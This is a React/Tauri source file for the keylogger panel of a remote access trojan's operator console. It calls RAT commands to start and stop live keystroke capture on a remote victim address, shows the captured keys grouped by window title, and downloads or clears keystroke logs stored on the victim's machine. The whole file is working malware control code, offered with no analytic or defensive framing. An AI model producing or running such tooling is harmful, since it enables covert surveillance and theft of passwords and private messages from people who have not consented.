import React, { useEffect, useState, useRef, useMemo } from "react";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  startKeyloggerCmd,
  stopKeyloggerCmd,
  getOfflineLogsCmd,
  clearOfflineLogsCmd,
} from "../rat/RATCommands";
import {
  IconKeyboard,
  IconPlayerPlay,
  IconPlayerStop,
  IconDownload,
  IconTrash,
  IconHistory,
  IconDeviceDesktop,
  IconClock,
  IconTerminal2,
} from "@tabler/icons-react";
import { KeyloggerUpdatePayload, KeyloggerOfflineLogsPayload } from "../../types";

interface KeyEntry {
  window: string;
  data: string;
  timestamp: Date;
}

interface GroupedLog {
  window: string;
  timestamp: string;
  content: { text: string; isSpecial: boolean }[];
}

export const Keylogger: React.FC = () => {
  const { addr } = useParams();
  const [realtime, setRealtime] = useState(false);
  const [logs, setLogs] = useState<KeyEntry[]>([]);
  const [offlineLogs, setOfflineLogs] = useState<string[]>([]);
  const [viewMode, setViewMode] = useState<"realtime" | "offline">("realtime");
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const unlistenUpdate = listen("keylogger_update", (event) => {
      const payload = event.payload as KeyloggerUpdatePayload;
      if (payload.addr === addr) {
        setLogs((prev) => [
          ...prev,
          {
            window: payload.window,
            data: payload.data,
            timestamp: new Date(),
          },
        ]);
      }
    });

    const unlistenOffline = listen("keylogger_offline_logs", (event) => {
      const payload = event.payload as KeyloggerOfflineLogsPayload;
      if (payload.addr === addr) {
        setOfflineLogs(payload.logs);
        setViewMode("offline");
      }
    });

    return () => {
      unlistenUpdate.then((fn) => fn());
      unlistenOffline.then((fn) => fn());
    };
  }, [addr]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs, viewMode]);

  const groupedLogs = useMemo(() => {
    const groups: GroupedLog[] = [];
    let currentGroup: GroupedLog | null = null;

    logs.forEach((log) => {
      const isSpecial = log.data.startsWith("[") && log.data.endsWith("]");
      
      if (currentGroup && currentGroup.window === log.window) {
        currentGroup.content.push({ text: log.data, isSpecial });
      } else {
        currentGroup = {
          window: log.window,
          timestamp: log.timestamp.toLocaleTimeString(),
          content: [{ text: log.data, isSpecial }],
        };
        groups.push(currentGroup);
      }
    });

    return groups;
  }, [logs]);

  const handleStart = async () => {
    try {
      await startKeyloggerCmd(addr, true);
      setRealtime(true);
      setViewMode("realtime");
    } catch (e) {
      console.error(e);
    }
  };

  const handleStop = async () => {
    try {
      await stopKeyloggerCmd(addr);
      setRealtime(false);
    } catch (e) {
      console.error(e);
    }
  };

  const handleGetOffline = async () => {
    try {
      await getOfflineLogsCmd(addr);
    } catch (e) {
      console.error(e);
    }
  };

  const handleClearOffline = async () => {
    try {
      await clearOfflineLogsCmd(addr);
      setOfflineLogs([]);
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <div className="flex flex-col h-screen bg-[#0a0a0a] text-white font-sans overflow-hidden">
      {/* Header */}
      <div className="p-4 bg-[#0f0f0f] border-b border-[#1f1f1f] flex items-center justify-between shadow-2xl z-10">
        <div className="flex items-center gap-4">
          <div className="relative">
            <div className={`absolute inset-0 bg-accentx opacity-20 blur-lg rounded-full ${realtime ? "animate-pulse" : ""}`} />
            <div className="relative p-2.5 bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl shadow-inner">
              <IconKeyboard className="text-accentx" size={26} />
            </div>
          </div>
          <div>
            <h2 className="text-xl font-black tracking-tight text-white uppercase italic">Keylogger <span className="text-accentx">Live</span></h2>
            <div className="flex items-center gap-2 text-[10px] text-gray-500 font-mono mt-0.5">
              <IconTerminal2 size={12} className="text-accentx opacity-50" />
              <span>{addr}</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="flex bg-[#1a1a1a] rounded-xl p-1 border border-[#2a2a2a] shadow-inner">
            <button
              onClick={() => setViewMode("realtime")}
              className={`flex items-center gap-2 px-4 py-1.5 rounded-lg text-xs font-bold transition-all duration-300 ${
                viewMode === "realtime"
                  ? "bg-accentx text-white shadow-[0_0_15px_rgba(var(--accent-rgb),0.3)]"
                  : "text-gray-500 hover:text-white"
              }`}
            >
              <IconTerminal2 size={14} />
              REALTIME
            </button>
            <button
              onClick={() => setViewMode("offline")}
              className={`flex items-center gap-2 px-4 py-1.5 rounded-lg text-xs font-bold transition-all duration-300 ${
                viewMode === "offline"
                  ? "bg-accentx text-white shadow-[0_0_15px_rgba(var(--accent-rgb),0.3)]"
                  : "text-gray-500 hover:text-white"
              }`}
            >
              <IconHistory size={14} />
              OFFLINE
            </button>
          </div>

          <div className="h-8 w-[1px] bg-[#2a2a2a] mx-1" />

          {!realtime ? (
            <button
              onClick={handleStart}
              className="flex items-center gap-2 px-5 py-2 bg-[#00c853] hover:bg-[#00e676] text-black rounded-xl text-sm font-black transition-all shadow-[0_0_20px_rgba(0,200,83,0.2)] active:scale-95 group"
            >
              <IconPlayerPlay size={18} className="fill-black group-hover:scale-110 transition-transform" />
              START
            </button>
          ) : (
            <button
              onClick={handleStop}
              className="flex items-center gap-2 px-5 py-2 bg-[#ff1744] hover:bg-[#ff5252] text-white rounded-xl text-sm font-black transition-all shadow-[0_0_20px_rgba(255,23,68,0.2)] active:scale-95 group"
            >
              <IconPlayerStop size={18} className="fill-white group-hover:scale-110 transition-transform" />
              STOP
            </button>
          )}
          
          <button
            onClick={handleGetOffline}
            className="p-2.5 bg-[#1a1a1a] hover:bg-[#2a2a2a] border border-[#2a2a2a] rounded-xl text-gray-300 hover:text-accentx transition-all active:scale-95"
            title="Download Offline Logs"
          >
            <IconDownload size={20} />
          </button>
          
          <button
            onClick={handleClearOffline}
            className="p-2.5 bg-[#1a1a1a] hover:bg-red-900/30 hover:text-red-500 border border-[#2a2a2a] hover:border-red-500/50 rounded-xl text-gray-300 transition-all active:scale-95"
            title="Clear Offline Logs"
          >
            <IconTrash size={20} />
          </button>
        </div>
      </div>

      {/* Main View */}
      <div className="flex-1 overflow-hidden p-6 relative bg-radial-dots">
        <div className="h-full w-full bg-[#0d0d0d]/80 rounded-2xl border border-[#1f1f1f] flex flex-col overflow-hidden backdrop-blur-xl shadow-2xl">
          {/* Status Bar for Log Area */}
          <div className="px-4 py-2 border-b border-[#1f1f1f] bg-[#141414] flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="flex gap-1.5">
                <div className="w-2.5 h-2.5 rounded-full bg-[#ff5f56]" />
                <div className="w-2.5 h-2.5 rounded-full bg-[#ffbd2e]" />
                <div className="w-2.5 h-2.5 rounded-full bg-[#27c93f]" />
              </div>
              <span className="ml-4 text-[10px] font-mono text-gray-500 uppercase tracking-widest flex items-center gap-2">
                <IconTerminal2 size={12} />
                CONSOLE_OUTPUT_{viewMode.toUpperCase()}
              </span>
            </div>
            <div className="text-[10px] font-mono text-gray-600">
              {new Date().toLocaleDateString()}
            </div>
          </div>

          {/* View Container */}
          <div className="flex-1 overflow-y-auto p-0 custom-scrollbar bg-[#080808]">
            {viewMode === "realtime" ? (
              <div className="flex flex-col min-h-full">
                {groupedLogs.length === 0 && (
                  <div className="flex-1 flex flex-col items-center justify-center text-gray-600">
                    <div className="relative mb-4">
                      <div className="absolute inset-0 bg-accentx/5 blur-3xl rounded-full" />
                      <IconKeyboard size={64} className="opacity-10 relative" />
                    </div>
                    <p className="text-sm font-medium tracking-wide">NO INPUT STREAM DETECTED</p>
                    <p className="text-[10px] font-mono opacity-50 mt-1">AWAITING CLIENT PACKETS...</p>
                  </div>
                )}
                
                {groupedLogs.map((group, i) => (
                  <div key={i} className="border-b border-[#111] hover:bg-[#0c0c0c] transition-colors group/row">
                    <div className="flex flex-col sm:flex-row items-start sm:items-center px-6 py-3 gap-2 sm:gap-4 border-l-2 border-transparent group-hover/row:border-accentx">
                      <div className="flex items-center gap-2 shrink-0 min-w-[140px]">
                        <IconClock size={12} className="text-gray-600" />
                        <span className="text-[11px] font-mono text-gray-500">{group.timestamp}</span>
                      </div>
                      
                      <div className="flex items-center gap-2 px-2.5 py-1 bg-[#1a1a1a] rounded-lg border border-[#2a2a2a] shrink-0 max-w-full overflow-hidden">
                        <IconDeviceDesktop size={12} className="text-accentx shrink-0" />
                        <span className="text-[11px] font-black text-gray-300 truncate tracking-tight uppercase">
                          {group.window}
                        </span>
                      </div>
                      
                      <div className="flex-1 font-mono text-sm break-all leading-relaxed pt-2 sm:pt-0">
                        {group.content.map((item, j) => (
                          <span 
                            key={j} 
                            className={`transition-all duration-200 ${
                              item.isSpecial 
                                ? "inline-block mx-0.5 px-1.5 py-0.5 rounded bg-accentx/10 text-accentx text-[10px] font-bold border border-accentx/20 shadow-[0_0_10px_rgba(var(--accent-rgb),0.1)]" 
                                : "text-gray-100 group-hover/row:text-white"
                            }`}
                          >
                            {item.text}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>
                ))}
                <div ref={logEndRef} className="h-10" />
              </div>
            ) : (
              <div className="flex flex-col min-h-full">
                {offlineLogs.length === 0 && (
                  <div className="flex-1 flex flex-col items-center justify-center text-gray-600">
                    <IconDownload size={64} className="opacity-10 mb-4" />
                    <p className="text-sm font-medium tracking-wide">OFFLINE LOGS EMPTY</p>
                    <p className="text-[10px] font-mono opacity-50 mt-1">FETCH FROM CLIENT TO VIEW HISTORY</p>
                  </div>
                )}
                {offlineLogs.map((log, i) => (
                  <div key={i} className="px-6 py-3 border-b border-[#111] font-mono text-xs text-gray-400 hover:text-white hover:bg-[#0c0c0c] transition-all">
                    <span className="text-accentx opacity-50 mr-2">{(i+1).toString().padStart(3, '0')}</span>
                    {log}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
      
      {/* Footer / Status */}
      <div className="px-6 py-3 bg-[#0f0f0f] border-t border-[#1f1f1f] flex justify-between items-center text-[10px] text-gray-600">
        <div className="flex gap-6 items-center">
          <span className="flex items-center gap-2 font-black tracking-tighter uppercase italic">
            <div className={`w-2 h-2 rounded-full ${realtime ? "bg-[#00c853] shadow-[0_0_10px_#00c853] animate-pulse" : "bg-[#333]"}`} />
            {realtime ? "System_Intercept_Active" : "System_Idle"}
          </span>
          <div className="h-3 w-[1px] bg-[#222]" />
          <span className="font-mono tracking-widest uppercase">
            Captured: <span className={logs.length > 0 ? "text-accentx font-bold" : ""}>{viewMode === "realtime" ? logs.length : offlineLogs.length}</span> Objects
          </span>
        </div>
        <div className="font-mono opacity-30 select-none">
          SECURE_ENCRYPTED_STREAM // ADDR::{addr}
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar {
          width: 8px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: #080808;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: #1a1a1a;
          border-radius: 0;
          border: 1px solid #222;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #222;
          border-color: #333;
        }
        .bg-radial-dots {
          background-image: radial-gradient(#1a1a1a 1px, transparent 1px);
          background-size: 24px 24px;
        }
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(5px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .group\\/row {
          animation: fade-in 0.3s ease-out forwards;
        }
      `}} />
    </div>
  );
};
